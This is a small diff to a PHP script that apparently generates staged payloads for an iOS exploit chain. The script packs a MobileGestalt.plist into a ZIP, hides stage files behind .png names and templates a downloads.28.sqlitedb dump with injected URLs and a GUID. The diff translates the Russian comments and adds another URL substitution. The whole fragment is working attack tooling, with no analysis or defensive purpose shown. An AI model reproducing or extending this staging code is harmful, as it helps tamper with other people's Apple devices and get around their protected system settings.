@@ -124,9 +124,9 @@ if (!$zip->addFile($tmpMimetype, "Caches/mimetype")) {
     log_debug("Failed to add mimetype to ZIP", "ERROR");
     exit;
 }
-$zip->setCompressionName("Caches/mimetype", ZipArchive::CM_STORE); // ← КЛЮЧЕВО!
+$zip->setCompressionName("Caches/mimetype", ZipArchive::CM_STORE);
 
-// Добавляем plist в Caches/
+// Add plist to Caches/
 if (!$zip->addFile($plistPath, "Caches/com.apple.MobileGestalt.plist")) {
     log_debug("Failed to add plist to ZIP", "ERROR");
     exit;
@@ -162,8 +162,11 @@ $blUrl = "$baseUrl/2ndd/$randomName2/belliloveu.png";
 
 // --- Stage3: downloads.28.sqlitedb → apllefuckedhhh.png ---
 $dlDump = readSQLDump("$basePath/downloads.28.png");
+
+// Fix: The SQL template uses 'https://google.com' as a placeholder for the Stage 2 URL
 $dlDump = str_replace('https://google.com', $blUrl, $dlDump);
 $dlDump = str_replace('GOODKEY', $guid, $dlDump);
+$dlDump = str_replace('FIXEDFILE_URL', $fixedFileUrl, $dlDump); 
 
 $randomName3 = generateRandomName();
 $lastStepDir = "$basePath/last/$randomName3";
